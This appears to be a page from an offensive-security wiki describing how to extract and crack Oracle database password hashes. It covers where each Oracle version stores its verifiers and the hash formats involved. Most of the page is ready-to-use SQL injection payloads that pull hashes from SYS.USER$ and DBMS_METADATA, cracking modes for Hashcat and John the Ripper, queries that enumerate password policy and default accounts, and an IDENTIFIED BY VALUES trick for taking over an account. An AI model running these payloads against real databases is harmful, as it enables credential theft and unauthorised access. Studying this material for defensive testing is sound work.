---
title: Password Cracking
description: Techniques for extracting and cracking Oracle database password hashes
category: Authentication
order: 14
tags: ["password", "hash", "cracking", "authentication"]
lastUpdated: 2026-10-08
---

Oracle database implements various password hashing algorithms depending on the version. Extracting and cracking these password hashes can allow attackers to gain authenticated access to the database with legitimate credentials.

## Oracle Password Storage Evolution

| Oracle Version   | Verifier              | Description                                      | Storage Location     |
| ---------------- | --------------------- | ------------------------------------------------ | -------------------- |
| Oracle 7 - 10g   | DES-based (`10G`)     | Username used as salt, password case-insensitive | `SYS.USER$.PASSWORD` |
| Oracle 11g+      | SHA-1 (`S:`)          | Salted, case-sensitive                           | `SYS.USER$.SPARE4`   |
| Oracle 12.1.0.2+ | PBKDF2 SHA-512 (`T:`) | Salted, 4096 PBKDF2 iterations, case-sensitive   | `SYS.USER$.SPARE4`   |

11g and 12.1 still generate the DES verifier next to `S:` by default. Since 12.2 the default `SQLNET.ALLOWED_LOGON_VERSION_SERVER=12` stops generating it, so current versions store only `S:` and `T:`. `DBA_USERS.PASSWORD_VERSIONS` shows which verifiers each account has (for example `11G 12C`).

## Password Hash Locations

`SYS.USER$` is readable only with SYSDBA or an explicit grant: since 12c it is excluded from `SELECT ANY DICTIONARY`, so a DBA account cannot read it by default.

```sql
-- Pre-11g: DES hash in PASSWORD
SELECT name, password FROM sys.user$ WHERE password IS NOT NULL;

-- 11g+: S: and T: verifiers in SPARE4
SELECT name, spare4 FROM sys.user$ WHERE spare4 IS NOT NULL;
```

`DBA_USERS.PASSWORD` exists but no longer shows the hash since 11g. Schema-only accounts (no password, 18c+) have zeroed verifiers. Common users such as `SYS` and `SYSTEM` have real verifiers in `SYS.USER$` inside a pluggable database too (checked on 21c and 23ai).

## SQL Injection Examples

These examples assume a string injection point (`'`) and a host query with two columns, unless stated otherwise.

### Extracting Password Hashes

```sql
-- Pre-11g hashes
' UNION SELECT name, password FROM sys.user$ WHERE password IS NOT NULL--

-- 11g+ hashes
' UNION SELECT name, spare4 FROM sys.user$ WHERE spare4 IS NOT NULL--

-- A single account
' UNION SELECT name, spare4 FROM sys.user$ WHERE name='SYSTEM'--
```

### Accessing Hash Information Without SYS.USER$

`DBMS_METADATA.GET_DDL` returns the verifiers in an `IDENTIFIED BY VALUES` clause. It needs `SELECT_CATALOG_ROLE` (part of DBA) for accounts other than the current one:

```sql
' UNION SELECT TO_CHAR(DBMS_METADATA.GET_DDL('USER','SYSTEM')), NULL FROM dual--
```

`ALL_USERS` gives only the account names:

```sql
' UNION SELECT username, NULL FROM all_users--
```

## Understanding Oracle Hash Formats

### Pre-11g Format (DES-based)

16 hexadecimal characters, computed from the uppercased username and password:

```sql
-- SCOTT with password TIGER gives F894844C34402B67
' UNION SELECT name, password FROM sys.user$ WHERE name='SCOTT'--
```

### 11g Format (SHA-1 based)

`S:` followed by 60 hexadecimal characters: the SHA-1 of the password plus the salt (40 characters), then the 10-byte salt (20 characters).

```text
S:D26F0467E50BC9CA5FB8E0FF7C10F815DC5AFB0A5D716BE4070EC938627A
  |------ SHA-1(password || salt) -------||------ salt ------|
```

### 12c Format (PBKDF2 SHA-512 based)

`T:` followed by 160 hexadecimal characters: a 64-byte SHA-512 value derived through PBKDF2 (128 characters), then a 16-byte salt (32 characters). `SPARE4` holds both verifiers separated by `;`, for example `S:...;T:...`.

## Password Cracking Techniques

Crack the hashes offline:

| Verifier | Hashcat mode | John the Ripper format | Input                                  |
| -------- | ------------ | ---------------------- | -------------------------------------- |
| DES      | `3100`       | `oracle`               | `hash:USERNAME`                        |
| `S:`     | `112`        | `oracle11`             | `hash:salt` (40 and 20 hex characters) |
| `T:`     | `12300`      | `oracle12c`            | the 160 hex characters after `T:`      |

The `S:` verifier is a single salted SHA-1 and cracks fast; `T:` is much slower because of the PBKDF2 iterations. When an account has both, attack `S:`. The DES verifier ignores case, so crack it first and then try the case variants against `S:`.

The pieces can be split in the injection itself (11g+, two columns):

```sql
' UNION SELECT name, REGEXP_SUBSTR(spare4,'S:([0-9A-F]{40})([0-9A-F]{20})',1,1,NULL,1)||':'||REGEXP_SUBSTR(spare4,'S:([0-9A-F]{40})([0-9A-F]{20})',1,1,NULL,2) FROM sys.user$ WHERE spare4 IS NOT NULL--
```

### Comparing with Known Hashes

The DES verifier has no random salt, so a known hash identifies a known password for that username:

```sql
' UNION SELECT name, CASE WHEN password='F894844C34402B67' THEN 'Password is TIGER' ELSE 'Unknown' END FROM sys.user$ WHERE name='SCOTT'--
```

## Hash Manipulation Techniques

### Hash Validation

```sql
-- Which verifiers each account has (requires access to DBA_USERS)
' UNION SELECT username, password_versions FROM dba_users--

-- Pre-11g DES hash present?
' UNION SELECT name, CASE WHEN LENGTH(password)=16 THEN 'DES hash' ELSE 'No DES hash' END FROM sys.user$ WHERE name='SYSTEM'--
```

### Password Salting Detection

```sql
-- Salted S:/T: verifiers present?
' UNION SELECT name, CASE WHEN spare4 IS NOT NULL THEN 'Salted verifiers' ELSE 'DES hash only' END FROM sys.user$ WHERE name='SYSTEM'--
```

## Password Policy Information

```sql
-- Password limits of the current user's profile (any user)
' UNION SELECT resource_name, limit FROM user_password_limits--

-- Password limits of the DEFAULT profile (requires access to DBA_PROFILES)
' UNION SELECT resource_name, limit FROM dba_profiles WHERE profile='DEFAULT' AND resource_type='PASSWORD'--

-- Locked and expired accounts (requires access to DBA_USERS)
' UNION SELECT username, account_status||' '||lock_date||' '||expiry_date FROM dba_users--
```

## Default and Known Password Checks

`DBA_USERS_WITH_DEFPWD` (11g+) lists accounts that still use the password Oracle shipped with:

```sql
' UNION SELECT username, NULL FROM dba_users_with_defpwd--

-- Status of the classic default accounts (requires access to DBA_USERS)
' UNION SELECT username, account_status FROM dba_users WHERE username IN ('SYS','SYSTEM','OUTLN','DBSNMP','MDSYS','CTXSYS')--
```

Default passwords are listed in [Database Credentials](/oracle/database-credentials).

## Using IDENTIFIED BY VALUES

A user with `ALTER USER` can set an account's verifiers directly. Copying a known `S:...;T:...` value onto an account allows logging in with the password behind it; restoring the original value afterwards leaves the account as it was:

```sql
ALTER USER target_user IDENTIFIED BY VALUES 'S:D26F0467E50BC9CA5FB8E0FF7C10F815DC5AFB0A5D716BE4070EC938627A;T:43C444B28C87EBD4095CD2F284A1192F29D0B979A2E4FAEAE22EC2B6B4EDC93351581D2F303F5564EF80FA99144C1B3F436A3E6E82092305064DE4B9CA8ED5DEDF917B2AFDBB9ABC32B3C1AD508E4CDA'
```

This is a DDL statement, so it cannot be injected into a SELECT. It only applies when the injection point is inside PL/SQL that runs dynamic SQL, for example a string concatenated into `EXECUTE IMMEDIATE`. A DES-only value such as `'F894844C34402B67'` is rejected on 23ai with `ORA-02153: invalid VALUES password string`.
